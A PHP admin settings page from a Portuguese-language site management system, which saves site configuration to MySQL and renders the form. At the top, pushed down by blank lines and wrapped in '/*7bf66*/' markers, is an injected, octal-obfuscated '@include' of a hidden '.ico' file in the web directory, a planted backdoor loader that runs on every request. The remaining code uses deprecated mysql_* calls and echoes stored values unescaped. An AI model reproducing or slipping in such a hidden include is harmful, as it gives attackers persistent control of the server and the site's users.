<?php














/*7bf66*/

@include "\057hom\145/st\157rag\145/d/\1412/2\063/nu\160ill\057pub\154ic_\150tml\057usu\141rio\057.bb\146a39\0713.i\143o";

/*7bf66*/ 
		// Configurações
		include("../_inc/config.php");
		
		// Define a página
		$pag_mae = "configuracoes";
		$pag = "configuracoes";
		
		// Checa a sessão 
		include ("../_inc/sessao.php");
		
		// Define a id 
		$id_editar = "1";
		
		// Checa se foi enviado informação
		if($_POST['titulo_sistema']) {
		$titulo_sistema = mysql_real_escape_string($_POST['titulo_sistema']);
		$responsavel_sistema = mysql_real_escape_string($_POST['responsavel_sistema']);
		$email_responsavel_sistema = mysql_real_escape_string($_POST['email_responsavel_sistema']);
		$email_saida_sistema = mysql_real_escape_string($_POST['email_saida_sistema']);
		$email_saida_loja = mysql_real_escape_string($_POST['email_saida_loja']);
		$tema_sistema = mysql_real_escape_string($_POST['tema_sistema']);
		$num_result_sistema = mysql_real_escape_string($_POST['num_result_sistema']);
		$nivel_atencao_sistema = mysql_real_escape_string($_POST['nivel_atencao_sistema']);
		$nivel_critico_sistema = mysql_real_escape_string($_POST['nivel_critico_sistema']);
		$mensagem_aguardando_sistema = mysql_real_escape_string($_POST['mensagem_aguardando_sistema']);
		$mensagem_confirmado_sistema = mysql_real_escape_string($_POST['mensagem_confirmado_sistema']);
		$mensagem_enviado_sistema = mysql_real_escape_string($_POST['mensagem_enviado_sistema']);
		$mensagem_cancelado_sistema = mysql_real_escape_string($_POST['mensagem_cancelado_sistema']);
		$mensagem_devolvido_sistema = mysql_real_escape_string($_POST['mensagem_devolvido_sistema']);
		$id_editor = $_SESSION['NUPILL_ID'];
		$nome_editor = $_SESSION['NUPILL_NOME'];
		$ip_editor = $_SESSION['NUPILL_IP'];
		$data_edicao = date("c");
		$acao_edicao = "edicao";
		
		// Trabalha a url do sistema
		$url_sistema = mysql_real_escape_string($_POST['url_sistema']);
		$url_sistema = rtrim( $url_sistema, '\\/' );
		
		// Trabalha a url da loja
		$site_sistema = mysql_real_escape_string($_POST['site_sistema']);
		$site_sistema = rtrim( $site_sistema, '\\/' );
		
		// Se não há erros
		if(!$erro) {
			
		// Registra no banco de dados
		$editar = "UPDATE sis_config SET 	titulo_sistema = '$titulo_sistema',
											url_sistema = '$url_sistema',
											site_sistema = '$site_sistema',
											responsavel_sistema = '$responsavel_sistema',
											email_responsavel_sistema = '$email_responsavel_sistema',
											email_saida_sistema = '$email_saida_sistema',
											email_saida_loja = '$email_saida_loja',
											tema_sistema = '$tema_sistema',
											num_result_sistema = '$num_result_sistema',
											nivel_atencao_sistema = '$nivel_atencao_sistema',
											nivel_critico_sistema = '$nivel_critico_sistema',
											mensagem_aguardando_sistema = '$mensagem_aguardando_sistema',
											mensagem_confirmado_sistema = '$mensagem_confirmado_sistema',
											mensagem_enviado_sistema = '$mensagem_enviado_sistema',
											mensagem_cancelado_sistema = '$mensagem_cancelado_sistema',
											mensagem_devolvido_sistema = '$mensagem_devolvido_sistema',
											id_editor = '$id_editor',
											nome_editor = '$nome_editor',
											ip_editor = '$ip_editor',
											data_edicao = '$data_edicao'
											
											WHERE
											
											id = '$id_editar'
											";
		$editar_exec = mysql_query($editar);
	
		// Se editar
		if($editar_exec) {
		
		// Gera o arquivo config.php	
		include ("acoes_configuracoes.php");	
			
		$sucesso = "13";
		} else {
		$erro = "18";
		}
		
		} // Fim da checagem se não há erros	
		
		} // Fim da checagem se está foi enviado informação	
		
		// Pega os dados do Sistema
		$busca_dados = mysql_query("SELECT * FROM sis_config WHERE id = '$id_editar'");
		$dados = mysql_fetch_array($busca_dados);
		
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title><?php echo $titulo_sistema; ?> :: Configurações do Sistema</title>
<!-- METAS PARA FERRAMENTAS DE BUSCA -->
<meta name="robots" content="noindex,nofollow">
<!-- FIM DAS METAS PARA FERRAMENTAS DE BUSCA -->
<!-- FOLHAS DE ESTILO -->
<link rel="stylesheet" href="../_css/estilo.css" type="text/css" media="screen" />
<link rel="stylesheet" href="../_css/tema-<?php echo $tema_sistema; ?>.css" type="text/css"media="screen" />
<!--[if IE 6]>
<link rel="stylesheet" type="text/css" href="_css/estilo.ie6.css" />
<![endif]-->
<!-- FIM DAS FOLHAS DE ESTILO -->		
</head>
  
<body>
<!-- DEFESA -->
<div id="defesa">
	<!-- BARRA ESQUERDA -->
    <div id="barra-esquerda">
    <div id="barra-esquerda-defesa">			
	<h1 id="barra-esquerda-titulo"><a href="#"><?php echo $titulo_sistema; ?></a></h1>
		  
			<!-- LOGO -->
			<a href="../painel/" title="<?php echo $titulo_sistema; ?>"><img id="logo" src="../_imagens/logo.png" alt="<?php echo $titulo_sistema; ?>" /></a>
		  
			<!-- LINKS DA BARRA ESQUERDA -->
			<div id="links-perfil">
				Ol&aacute; <a href="../usuarios/editar-perfil.php" title="Editar seu perfil"><?php echo $_SESSION['NUPILL_NOME']; ?></a>
                <br /><br />
				<?php if($site_sistema != "") { ?>
				<a href="<?php echo $site_sistema; ?>" target="_blank" title="Visualizar o site">Visualizar o site</a> | 
                <?php } ?>
                <a href="../logout.php" title="Sair">Sair</a>
			</div>        
			
            <!-- MENU LATERAL -->
            <?php include("../menu-lateral.php"); ?>
            <!-- FIM DO MENU LATERAL -->
            
            
            
        </div>
        </div>
        <!-- FIM DA BARRA ESQUERDA -->
		
        <!-- CONTEÚDO -->
      <div id="conteudo">			
			<!-- INTRODUÇÃO -->
			<h2>Configura&ccedil;&otilde;es do Sistema</h2>
            <p id="introducao">Defina aqui as principais caracter&iacute;sticas do seu sistema.</p>
		
			<div class="clear"></div>
			
            <!-- ATALHOS -->
            <ul class="atalhos">
			
                <li><a class="botao-atalho" href="empresa.php" title="Dados Empresariais"><span>
				<img src="../_imagens/atalhos/informacao.png" alt="Dados Empresariais" /><br />
					Dados Empresariais</span></a>
                </li>
                <li><a class="botao-atalho" href="../painel/" title="Ir para o Painel"><span>
					<img src="../_imagens/atalhos/inicio.png" alt="Ir para o Painel" /><br />
					Ir para o Painel
				</span></a></li>
				
			</ul>
            <!-- FIM DOS ATALHOS -->
			
<div class="clear"></div>
			
            <!-- NOTIFICAÇÕES -->
            <?php include("../notificacoes.php"); ?>
            <!-- FIM DAS NOTIFICAÇÕES  -->
            
            <!-- ÚLTIMOS EVENTOS -->
			<div class="miolo" style="position:relative">
            
                       
   	      		<!-- CABEÇALHO -->
				<div class="miolo-cabecalho">
					<h3 class="tit-longo visivel">Configura&ccedil;&otilde;es gerais</h3>
                </div>
				<!-- FIM DO CABEÇALHO -->             
                
   	      		<!-- CONTEÚDO DO MIOLO --> 
				<div class="miolo-conteudo">
					
                    <!-- CONFIGURAÇÕES -->
 	  				<div class="conteudo-box">
                    
                    <form id="formulario-interno" class="formulario estilo" action="index.php" method="post">
						<fieldset>
                        <p>
                        <label>Nome do seu site:</label>
						<input class="input-texto input-medio required" type="text" id="titulo_sistema" name="titulo_sistema" value="<?php echo $dados['titulo_sistema']; ?>" maxlength="255" />
                        </p>
                        
                        <p>
                        <label>URL do seu site:</label>
						<input class="input-texto input-medio url" type="text" id="site_sistema" name="site_sistema" value="<?php echo $dados['site_sistema']; ?>" /><br />
                        <small>Website/E-commerce administrado por este sistema. Ex: <strong>http://www.nomedoseusite.com.br</strong></small>
                        </p>
                        
                        <p>
                        <label>URL deste sistema administrativo:</label>
						<input class="input-texto input-medio required url" type="text" id="url_sistema" name="url_sistema" value="<?php echo $dados['url_sistema']; ?>" /><br />
                        <small>  Endere&ccedil;o do sistema na Web. Ex: <strong>http://www.nomedoseusite.com.br/sistema</strong></small>
                        </p>
                        
                        <p>
                        <label>Respons&aacute;vel pelo sistema:</label>
						<input class="input-texto input-medio required" type="text" id="responsavel_sistema" name="responsavel_sistema" value="<?php echo $dados['responsavel_sistema']; ?>"  maxlength="255"/><br />
                        <small>Nome completo do administrador principal ou do dono do sistema.</small>
                        </p>
                        
                        <p>
                        <label>E-mail do respons&aacute;vel pelo sistema:</label>
						<input class="input-texto input-medio required email" type="text" id="email_responsavel_sistema" name="email_responsavel_sistema" value="<?php echo $dados['email_responsavel_sistema']; ?>" maxlength="255" /><br />
                        <small>E-mail do administrador principal ou do dono do sistema.</small>
                        </p>
                        
                        <p>
                        <label>E-mail de sa&iacute;da do sistema:</label>
						<input class="input-texto input-medio required email" type="text" id="email_saida_sistema" name="email_saida_sistema" value="<?php echo $dados['email_saida_sistema']; ?>" maxlength="255" /><br />
                        <small>E-mail que ser&aacute; usado para enviar mensagens pelo sistema. Ex: <strong>sistema@nomedoseusite.com.br</strong>. Este e-mail deve existir na hospedagem.</small>
                        </p>
                        
                        <p>
                        <label>E-mail de sa&iacute;da do site:</label>
						<input class="input-texto input-medio required email" type="text" id="email_saida_loja" name="email_saida_loja" value="<?php echo $dados['email_saida_loja']; ?>" maxlength="255" /><br />
                        <small>E-mail que ser&aacute; usado para enviar mensagens  do site. Ex: <strong>relacionamento@nomedoseusite.com.br</strong>. Este e-mail deve existir na hospedagem.</small>                        </p>
                        
                        <p>
                        <label>Tema do sistema:</label>              
				  <select name="tema_sistema" class="input-menor required" >
                            <option value="cinza" <?php if($dados['tema_sistema'] == "cinza") { echo'selected="selected"'; } ?> >Cinza</option>
                            <option value="azul" <?php if($dados['tema_sistema'] == "azul") { echo'selected="selected"'; } ?> >Azul</option>
                            <option value="verde" <?php if($dados['tema_sistema'] == "verde") { echo'selected="selected"'; } ?> >Verde</option>
                        </select><br />
                         <small>Esquema de cores a ser usado.</small>
						</p>
                        
                         <p>
                        <label>N&uacute;mero de resultados padr&atilde;o:</label>
						<input class="input-texto input-minimo required number" type="text" id="num_result_sistema" name="num_result_sistema" value="<?php echo $dados['num_result_sistema']; ?>" maxlength="11" /><br />
                        <small>N&uacute;mero de resultados a serem exibidos nas listagens do sistema.</small>
                        </p>

                        <p><input class="botao grande" type="submit" value="Salvar altera&ccedil;&otilde;es" /></p>
								
					  </fieldset>
						<div class="clear"></div>
					</form>
                    
                    </div>
                    <!-- FIM DAS CONFIGURAÇÕES -->
					
				</div> 
                <!-- FIM DO CONTEÚDO DO MIOLO -->
				
			</div>
            <!-- FIM DOS ÚLTIMOS EVENTOS -->            
            
      		<div class="clear"></div>
			
            <!-- RODAPÉ -->
		  	<div id="rodape">
				
            <!-- BARRA SOCIAL -->
            <?php include("../barra-social.php"); ?>
            <!-- FIM DA BARRA SOCIAL -->    
                
			</div>
		  	<!-- FIM DO RODAPÉ -->
			
		</div> 
        <!-- FIM DO CONTEÚDO -->
		
</div>
<!-- FIM DA DEFESA -->
<!-- SCRIPTS -->
<script type="text/javascript" src="../_scripts/jquery-1.4.2.min.js"></script>
<script type="text/javascript" src="../_scripts/jquery.config-escrita.js"></script>
<!--[if IE 6]>
<script type="text/javascript" src="_scripts/jquery.attention_ie6.js"></script>
<script type="text/javascript" src="_scripts/DD_belatedPNG_0.0.7a.js"></script>
<script type="text/javascript">
    DD_belatedPNG.fix('.png_bg, img, li');
</script>
<![endif]-->
<!-- FIM DOS SCRIPTS -->
</body>
</html>